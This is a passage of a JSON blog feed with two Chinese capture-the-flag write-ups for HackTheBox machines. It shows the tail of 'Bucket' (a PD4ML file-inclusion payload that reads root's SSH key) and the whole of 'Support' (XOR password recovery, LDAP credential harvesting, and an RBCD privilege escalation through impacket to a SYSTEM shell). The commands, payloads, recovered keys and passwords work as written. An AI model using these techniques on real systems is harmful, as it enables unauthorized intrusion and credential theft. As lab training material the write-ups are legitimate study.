http://bucket.htb:4567\n```\n\n```bash\naws dynamodb tables-list --endpoint-url http://bucket.htb:4567\n{\n    \"TableNames\": [\n        \"Music\",\n        \"alerts\",\n        \"users\"\n    ]\n}\n```\n\n但是我们能发现一会后，`alerts`表就会被删除，所以我们要通过脚本来执行操作\n\n尝试包含文件，这里我们查看`pd4ml`的文档，其中有一项是添加附件：https://pd4ml.com/support-topics/usage-examples/#add-attachment\n\n```bash\n<html><pd4ml:attachment style=\\\"align: right\\\" type=\\\"paperclip\\\" src=\\\"/root/root.txt\\\"/></html>\n```\n\n编写脚本\n\n```bash\necho 'create table alerts\\n'\naws dynamodb create-table \\\n    --table-name alerts \\\n    --attribute-definitions \\\n        AttributeName=title,AttributeType=S \\\n        AttributeName=data,AttributeType=S \\\n    --key-schema \\\n        AttributeName=title,KeyType=HASH \\\n        AttributeName=data,KeyType=RANGE \\\n    --provisioned-throughput \\\n        ReadCapacityUnits=5,WriteCapacityUnits=5 \\\n    --endpoint-url http://bucket.htb:4567\n\nsleep 2;\necho 'create talbe success?\\n'\naws dynamodb list-tables --endpoint-url http://bucket.htb:4567\nsleep 2;\necho 'Insert data:\\n'\naws dynamodb put-item \\\n    --table-name alerts  \\\n    --item \\\n        '{\"title\": {\"S\": \"Ransomware\"}, \"data\": {\"S\": \"<pd4ml:attachment description=\\\"attached.txt\\\" icon=\\\"PushPin\\\">file:///root/.ssh/id_rsa</pd4ml:attachment>\"}}' \\\n    --endpoint-url http://bucket.htb:4567\necho 'POST endpoint && copy the file'\ncurl http://bucket.htb:8001 -X POST -d 'action=get_alerts'\n```\n\n查看 `result.pdf` ，能拿到私钥\n\n```bash\n-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAYEAx6VphKMyxurjldmb6dy1OSn0D9dumFAUCeSoICwhhsq+fadx21SU\n......\npHoTvd81++IRB1+g6GGy0gq/j0Tp+g3e0KLtvr7ZfAtutO8bcDrLjHu6Wqyl1KoleFsv6/\nlt0oT70NTv2gFGWAb6WHLEByEsnYQwk5ynbIblaApQSZEyVEPkf9LmO7AEb08lvAOS0dQ1\nxMyLerif0cNjmemwAAAAtyb290QHVidW50dQECAwQFBg==\n-----END OPENSSH PRIVATE KEY-----\n```\n\n通过私钥登录后，读取 `root.txt`\n\n```bash\nroot@bucket:~# cat root.txt \n880bb2407bd062f1f9896875e8d049bf\n```\n\n## 总结\n\n又一次感到自己是真的无耐心…一烦躁起来就无法思考。。这次碰到新东西，卡了还是蛮久的，不过利用都没什么挡住的地方，除了最后的读取文件。\n\n学习到了 `AWS S3`，以及一些`Dynamodb` 的知识",
            "url": "https://www.sunsetaction.top/2025/06/06/HackTheBoxMachine - Bucket",
            "title": "HackTheBox - Machine - Bucket",
            "summary": "Machine Bucket https://app.hackthebox.com/machines/Bucket | Linux | Medium Recon 端口扫描 访问 HTTP 主页上没有一点信息，对目录进行爆破 但是我注意到源代码中的图片是通过子域名http://s3.bucket.ht...",
            "date_modified": "2025-06-06T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "靶机",
                "HackTheBox",
                "Linux",
                "AWS_S3",
                "Dynamodb",
                "PD4ML"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/06/05/HackTheBoxMachine -Support",
            "content_html": "\n# Machine -Support\n\n> https://app.hackthebox.com/machines/Support | `Windows` | `~~Easy~~` `Medium`\n> \n\n![image.png](/post-images/HackTheBoxMachine%20-Support/image.png)\n\n## Recon\n\n### 端口信息\n\n使用 `nmap` 进行扫描\n\n```bash\n➜  Support nmap -sT -min-rate 5000 10.10.11.174\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-04 21:06 CST\nNmap scan report for support.htb (10.10.11.174)\nHost is up (0.13s latency).\nNot shown: 988 filtered tcp ports (no-response)\nPORT     STATE SERVICE\n53/tcp   open  domain\n88/tcp   open  kerberos-sec\n135/tcp  open  msrpc\n139/tcp  open  netbios-ssn\n389/tcp  open  ldap\n445/tcp  open  microsoft-ds\n464/tcp  open  kpasswd5\n593/tcp  open  http-rpc-epmap\n636/tcp  open  ldapssl\n3268/tcp open  globalcatLDAP\n3269/tcp open  globalcatLDAPssl\n5985/tcp open  wsman\n\nNmap done: 1 IP address (1 host up) scanned in 1.00 seconds\n```\n\n```bash\n➜  Support nmap -sT -A -p 53,88,135,138,389,445,636,593,3268,3269 10.10.11.174\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-04 21:07 CST\nNmap scan report for support.htb (10.10.11.174)\nHost is up (0.20s latency).\n\nPORT    STATE    SERVICE       VERSION\n53/tcp  open     domain        Simple DNS Plus\n88/tcp  open     kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-04 12:45:55Z)\n135/tcp open     msrpc         Microsoft Windows RPC\n138/tcp filtered netbios-dgm\n389/tcp open     ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)\n445/tcp open     microsoft-ds?\n636/tcp open     tcpwrapped\n593/tcp  open  ncacn_http Microsoft Windows RPC over HTTP 1.0\n3268/tcp open  ldap       Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)\n3269/tcp open  tcpwrapped\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning (JUST GUESSING): Microsoft Windows 2022 (88%)\nOS CPE: cpe:/o:microsoft:windows_server_2022\nAggressive OS guesses: Microsoft Windows Server 2022 (88%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-time: \n|   date: 2025-06-04T12:46:16\n|_  start_date: N/A\n|_clock-skew: -21m30s\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled and required\n\nTRACEROUTE (using proto 1/icmp)\nHOP RTT       ADDRESS\n1   122.30 ms 10.10.16.1\n2   237.33 ms support.htb (10.10.11.174)\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 68.41 seconds\n```\n\n### SMB 枚举\n\n测试`SMB`是否允许匿名登录\n\n```bash\n➜  Support smbclient -L 10.10.11.174 -U anonymous                                      \nPassword for [WORKGROUP\\anonymous]:\n\n        Sharename       Type      Comment\n        ---------       ----      -------\n        ADMIN$          Disk      Remote Admin\n        C$              Disk      Default share\n        IPC$            IPC       Remote IPC\n        NETLOGON        Disk      Logon server share \n        support-tools   Disk      support staff tools\n        SYSVOL          Disk      Logon server share \nReconnecting with SMB1 for workgroup listing.\ndo_connect: Connection to 10.10.11.174 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)\nUnable to connect with SMB1 -- no workgroup available\n```\n\n允许匿名登录，并且在`support-tools`中有一些工具，全部 `get` 下来\n\n```bash\n➜  Support smbclient //10.10.11.174/support-tools -U anonymous -N\nTry \"help\" to get a list of possible commands.\nsmb: \\> dir\n  .                                   D        0  Thu Jul 21 01:01:06 2022\n  ..                                  D        0  Sat May 28 19:18:25 2022\n  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 19:19:19 2022\n  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 19:19:55 2022\n  putty.exe                           A  1273576  Sat May 28 19:20:06 2022\n  SysinternalsSuite.zip               A 48102161  Sat May 28 19:19:31 2022\n  UserInfo.exe.zip                    A   277499  Thu Jul 21 01:01:07 2022\n  windirstat1_1_2_setup.exe           A    79171  Sat May 28 19:20:17 2022\n  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 19:19:43 2022\n\n                4026367 blocks of size 4096. 955928 blocks available\nsmb: \\> \n```\n\n1. `7-ZipPortable_21.07.paf.exe`:\n    - **工具:** 7-Zip Portable\n    - **用途:** 这是一个便携版本的 7-Zip 文件归档器。7-Zip 是一款免费开源的压缩/解压缩软件，支持多种格式，如 7z, ZIP, GZIP, TAR, RAR 等。`.paf.exe` 通常是 PortableApps.com 格式的便携应用。\n2. `npp.8.4.1.portable.x64.zip`:\n    - **工具:** Notepad++ Portable (64位)\n    - **用途:** 这是一个包含 Notepad++ 便携版的 ZIP 压缩文件。Notepad++ 是一款非常流行的免费源代码编辑器和 Windows 记事本替代品，支持多种编程语言，功能强大。\n3. `putty.exe`:\n    - **工具:** PuTTY\n    - **用途:** 这是一个独立的 PuTTY 可执行文件。PuTTY 是一款广受欢迎的免费开源终端模拟器、串行控制台和网络文件传输应用程序。它最常用于通过 SSH、Telnet 或 rlogin 协议连接到远程服务器。\n4. `SysinternalsSuite.zip`:\n    - **工具:** Sysinternals Suite\n    - **用途:** 这是一个包含微软 Sysinternals Suite 的 ZIP 压缩文件。Sysinternals Suite 是一套由 Mark Russinovich 开发的强大的 Windows 系统管理、故障排除和诊断工具集合（现在属于微软）。著名的工具包括 Process Explorer, Process Monitor, Autoruns, PsExec 等。\n5. `UserInfo.exe.zip`:\n    - **工具:** 未知 (可能为自定义或特定用途工具)\n    - **用途:** 这是一个名为 `UserInfo.exe` 的可执行文件的 ZIP 压缩包。从名称上看，它可能是一个用于收集或显示用户信息的工具。这可能是系统管理员常用的自定义脚本或小程序，或者是特定场景下需要的工具。在渗透测试中，这类自定义工具往往值得进一步分析。\n6. `windirstat1_1_2_setup.exe`:\n    - **工具:** WinDirStat 安装程序\n    - **用途:** 这是 WinDirStat 版本 1.1.2 的安装程序。WinDirStat 是一款磁盘使用情况统计查看器和清理工具，它可以图形化地显示磁盘空间占用情况，帮助用户找到占用空间大的文件和文件夹。\n7. `WiresharkPortable64_3.6.5.paf.exe`:\n    - **工具:** Wireshark Portable (64位)\n    - **用途:** 这是一个便携版本的 Wireshark。Wireshark 是世界上应用最广泛的网络协议分析器，用于捕获和交互式浏览计算机网络上运行的流量。`.paf.exe` 格式表明它也是 PortableApps.com 的便携应用。\n\n上面的所有应用中只有`UserInfo.exe` 不是公开的软件，我们可以着重对该软件进行分析\n\n## 分析 UserInfo.exe\n\n使用 `dnSpy` 来分析，该程序貌似是通过 `LDAP` 来检索用户信息，并且内置了用户（大致看懂）\n\n下面的类 `Protected` 是加密密码的（这里开始使用`AI`来分析）\n\n这一段代码其实是使用异或加密密码，并且秘钥是`armando` ，因此我们能够直接得到密码\n\n```bash\nusing System;\nusing System.Text;\n\nnamespace UserInfo.Services\n{\n\t// Token: 0x02000006 RID: 6\n\tinternal class Protected\n\t{\n\t\t// Token: 0x0600000F RID: 15 RVA: 0x00002118 File Offset: 0x00000318\n\t\tpublic static string getPassword()\n\t\t{\n\t\t\tbyte[] array = Convert.FromBase64String(Protected.enc_password);\n\t\t\tbyte[] array2 = array;\n\t\t\tfor (int i = 0; i < array.Length; i++)\n\t\t\t{\n\t\t\t\tarray2[i] = (array[i] ^ Protected.key[i % Protected.key.Length] ^ 223);\n\t\t\t}\n\t\t\treturn Encoding.Default.GetString(array2);\n\t\t}\n\n\t\t// Token: 0x04000005 RID: 5\n\t\tprivate static string enc_password = \"0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E\";\n\n\t\t// Token: 0x04000006 RID: 6\n\t\tprivate static byte[] key = Encoding.ASCII.GetBytes(\"armando\");\n\t}\n}\n```\n\n通过 `AI` 生成解密脚本\n\n```bash\nimport base64\n\n# 从 C# 代码中获取的值\nenc_password_b64 = \"0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E\"\nkey_string = \"armando\"\nxor_constant = 223\n\n# 1. Base64 解码\ntry:\n    encrypted_bytes = base64.b64decode(enc_password_b64)\nexcept base64.binascii.Error as e:\n    print(f\"Base64 解码错误: {e}\")\n    exit()\n\n# 2. 获取密钥的字节形式 (ASCII)\nkey_bytes = key_string.encode('ascii')\n\n# 准备一个可变的字节数组来存放解密后的字节\ndecrypted_bytes = bytearray()\n\n# 3. 执行 XOR 解密\nfor i in range(len(encrypted_bytes)):\n    # C# 中的逻辑是: (byte ^ key_byte ^ 223)\n    dec_byte = encrypted_bytes[i] ^ key_bytes[i % len(key_bytes)] ^ xor_constant\n    decrypted_bytes.append(dec_byte)\n\n# 4. 将解密后的字节数组转换为字符串\n# C# 中的 Encoding.Default 行为可能依赖于系统区域设置。\n# 我们首先尝试 'utf-8'，如果密码包含非 ASCII 字符且编码不同，可能需要调整。\n# 对于这个特定的密码 \"Cisco.12345\"，'utf-8' 或 'ascii' 都可以。\ntry:\n    final_password = decrypted_bytes.decode('utf-8')\nexcept UnicodeDecodeError:\n    # 如果 utf-8 失败，可以尝试其他编码，如 latin-1 (常用于模拟某些 Windows 默认编码)\n    try:\n        final_password = decrypted_bytes.decode('latin-1')\n    except UnicodeDecodeError as e:\n        print(f\"字符串解码错误: {e}\")\n        print(f\"解密后的字节（原始）: {decrypted_bytes}\")\n        final_password = \"解码失败，请检查编码\"\n\n# 打印结果\nprint(f\"Base64 编码的密文: {enc_password_b64}\")\nprint(f\"密钥字符串: {key_string}\")\nprint(f\"固定的 XOR 值: {xor_constant}\")\nprint(f\"解密后的字节 (十六进制): {decrypted_bytes.hex()}\")\nprint(f\"解密后的密码: {final_password}\")\n```\n\n```bash\n➜  Support python getpass.py       \nBase64 编码的密文: 0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E\n密钥字符串: armando\n固定的 XOR 值: 223\n解密后的字节 (十六进制): 6e764566454b31365e31614d3424653741636c55663878247452577850574f31256c6d7a\n解密后的密码: nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz\n```\n\n而 `LdapQuery` 类的构造函数中能看到\n\n```bash\npublic LdapQuery()\n\t\t{\n\t\t\tstring password = Protected.getPassword();\n\t\t\tthis.entry = new DirectoryEntry(\"LDAP://support.htb\", \"support\\\\ldap\", password);\n\t\t\tthis.entry.AuthenticationType = AuthenticationTypes.Secure;\n\t\t\tthis.ds = new DirectorySearcher(this.entry);\n\t\t}\n```\n\n创建 `DirectoryEntry` 对象时，第二个参数通常用于指定用户名。因此，这里的用户名是：`support\\ldap`\n\n这个格式 `DOMAIN\\username` 表明 `support` 可能是域名或者工作组名，而 `ldap` 是具体的用户名。\n\n我们直接测试凭据是否是正确的\n\n```bash\n➜  Support nxc ldap 10.10.11.174 -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -d support.htb\nLDAP        10.10.11.174    389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:support.htb)\nLDAP        10.10.11.174    389    DC               [+] support.htb\\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz \n```\n\n凭据是正确的\n\n## 域分析\n\n### 域初次分析\n\n`BloodHound` 分析域\n\n```bash\n➜  Support bloodhound-python -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -d 'support.htb' -ns 10.10.11.174 --zip -c All -dc 'support.htb'\nINFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)\nINFO: Found AD domain: support.htb\nINFO: Getting TGT for user\nINFO: Connecting to LDAP server: support.htb\nWARNING: Kerberos auth to LDAP failed, trying NTLM\nINFO: Found 1 domains\nINFO: Found 1 domains in the forest\nINFO: Found 3 computers\nINFO: Connecting to LDAP server: support.htb\nWARNING: Kerberos auth to LDAP failed, trying NTLM\nINFO: Found 21 users\nINFO: Found 53 groups\nINFO: Found 2 gpos\nINFO: Found 1 ous\nINFO: Found 19 containers\nINFO: Found 0 trusts\nINFO: Starting computer enumeration with 10 workers\nINFO: Querying computer: SummerMachine.support.htb\nINFO: Querying computer: Management.support.htb\nINFO: Querying computer: dc.support.htb\nWARNING: Could not resolve: SummerMachine.support.htb: The resolution lifetime expired after 3.104 seconds: Server Do53:10.10.11.174@53 answered The DNS operation timed out.\nINFO: Done in 00M 23S\nINFO: Compressing output into 20250605003230_bloodhound.zip\n```\n\n我们当前获得的用户 `Ldap` 的信息，仅仅只是域成员\n\n![image.png](/post-images/HackTheBoxMachine%20-Support/image1.png)\n\n所有的用户\n\n![image.png](/post-images/HackTheBoxMachine%20-Support/image2.png)\n\n我们查看远程组有哪些成员\n\n![image.png](/post-images/HackTheBoxMachine%20-Support/image3.png)\n\n`SUPPORT`用户信息\n\n![image.png](/post-images/HackTheBoxMachine%20-Support/image4.png)\n\n那我们大概是要先获取到`SUPPORT` 用户？但是现在没有别的信息了\n\n### LDAP 信息收集\n\n所以我们先使用 `LADP` 用户进行信息收集，找一些有用的信息\n\n我们首先查询用户信息\n\n```bash\n➜  Support ldapsearch -x -H ldap://10.10.11.174:389 -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b 'CN=USERS,DC=SUPPORT,DC=HTB' -D 'CN=LDAP,CN=USERS,DC=SUPPORT,DC=HTB'\n```\n\n信息太多了…\n\n我们尝试查一下`SUPPORT` 用户的信息\n\n```bash\n➜  Support ldapsearch -x -H ldap://10.10.11.174:389 -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b 'CN=SUPPORT,CN=USERS,DC=SUPPORT,DC=HTB' -D 'CN=LDAP,CN=USERS,DC=SUPPORT,DC=HTB'\n# extended LDIF                                     \n#                                  \n# LDAPv3     \n# base <CN=SUPPORT,CN=USERS,DC=SUPPORT,DC=HTB> with scope subtree\n# filter: (objectclass=*)\n# requesting: ALL                                                                                                 \n#                                       \n                                                         \n# support, Users, support.htb\ndn: CN=support,CN=Users,DC=support,DC=htb\nobjectClass: top\nobjectClass: person\nobjectClass: organizationalPerson\nobjectClass: user\ncn: support    \nc: US      \nl: Chapel Hill\nst: NC\npostalCode: 27514\ndistinguishedName: CN=support,CN=Users,DC=support,DC=htb\ninstanceType: 4\nwhenCreated: 20220528111200.0Z\nwhenChanged: 20220528111201.0Z\nuSNCreated: 12617\n**info: Ironside47pleasure40Watchful**\nmemberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb\nmemberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb\nuSNChanged: 12630\ncompany: support\nstreetAddress: Skipper Bowles Dr\nname: support\nobjectGUID:: CqM5MfoxMEWepIBTs5an8Q==\n```\n\n其中的`info`字段很有趣，可能就是该用户的凭据\n\n```bash\ninfo: Ironside47pleasure40Watchful\n```\n\n测试凭据，假如该凭据有效，那么我们就可以对`DC`进行远程了\n\n```bash\n➜  Support nxc wmi 10.10.11.174 -u support -p 'Ironside47pleasure40Watchful' -d support.htb\nRPC         10.10.11.174    135    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:support.htb)\nRPC         10.10.11.174    135    DC               [+] support.htb\\support:Ironside47pleasure40Watchful\n```\n\n该凭据有效\n\n```bash\n➜  Support evil-winrm -i 10.10.11.174 -u 'support' -p 'Ironside47pleasure40Watchful'\n                                        \nEvil-WinRM shell v3.7\n                                        \nWarning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline\n                                        \nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n                                        \nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\support\\Documents> \n```\n\n`Support`用户`Desktop`文件夹可以得到 `user.txt`\n\n```bash\n*Evil-WinRM* PS C:\\Users\\support\\Desktop> type user.txt\nd52f8d3f19ac0230628b1805483c760c\n```\n\n## 权限提升\n\n首先使用 `Winpeas` 走一波，没有很多的有用的信息\n\n`BloodHound`再进行分析，发现`Support`用户对`DC`有`GenericAll`权限\n\n![image.png](/post-images/HackTheBoxMachine%20-Support/image5.png)\n\n### RBCD 基于资源约束委派\n\n`Support`用户对`DC`有`GenericAll`权限，我们可以完全控制`DC`\n\n这里可以打 `RBCD`\n\n首先创建计算机账户\n\n```bash\n➜  Support addcomputer.py support.htb/support:'Ironside47pleasure40Watchful' -computer-name TEST\\$ -computer-pass 123456 -dc-host support.htb -dc-ip 10.10.11.174\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Successfully added machine account TEST$ with password 123456.\n```\n\n`RBCD` 委派设置，以`support`的身份登录到`DC`，修改计算机账户`DC$`的一个属性`msDS-AllowedToActOnBehalfOfOtherIdentity` \n\n```bash\n➜  Support rbcd.py support.htb/support:'Ironside47pleasure40Watchful' -dc-ip 10.10.11.174 -action write -delegate-to DC\\$ -delegate-from TEST\\$ \nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty\n[*] Delegation rights modified successfully!\n[*] TEST$ can now impersonate users on DC$ via S4U2Proxy\n[*] Accounts allowed to act on behalf of other identity:\n[*]     TEST$        (S-1-5-21-1677581083-3380853377-188903654-5601)\n```\n\n最后利用 `S4U` 协议伪造 `Administrator` 用户申请 `ST`\n\n```bash\n➜  Support getST.py -spn cifs/DC.support.htb -impersonate administrator support.htb/TEST\\$:'123456' -dc-ip 10.10.11.174\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Getting TGT for user\n[*] Impersonating administrator\n[*] Requesting S4U2self\n[*] Requesting S4U2Proxy\n[*] Saving ticket in administrator@cifs_DC.support.htb@SUPPORT.HTB.ccache\n```\n\n```bash\n➜  Support export KRB5CCNAME=Administrator@cifs_DC.support.htb@SUPPORT.HTB.ccache \n```\n\n```bash\n➜  Support psexec.py support.htb/administrator@dc.support.htb -k -no-pass\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Requesting shares on dc.support.htb.....\n[*] Found writable share ADMIN$\n[*] Uploading file niOpACUP.exe\n[*] Opening SVCManager on dc.support.htb.....\n[*] Creating service oDhJ on dc.support.htb.....\n[*] Starting service oDhJ.....\n[!] Press help for extra shell commands\nMicrosoft Windows [Version 10.0.20348.859]\n(c) Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32> \n```\n\n读取 `root.txt`\n\n```bash\nC:\\Users\\Administrator\\Desktop> type root.txt\n89306b6f9ce190f011354f60b3342424\n```",
            "url": "https://www.sunsetaction.top/2025/06/05/HackTheBoxMachine -Support",
            "title": "HackTheBox - Machine - Support",
            "summary": "Machine Support https://app.hackthebox.com/machines/Support | Windows | Easy Medium Recon 端口信息 使用 nmap 进行扫描 SMB 枚举 测试SMB是否允许匿名登录 允许匿名登录，并且在support too...",
            "date_modified": "2025-06-05T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "靶机",
                "HackTheBox",
                "Windows",
                "RBCD",
                "Reverse"
            ]
        }
    ]
}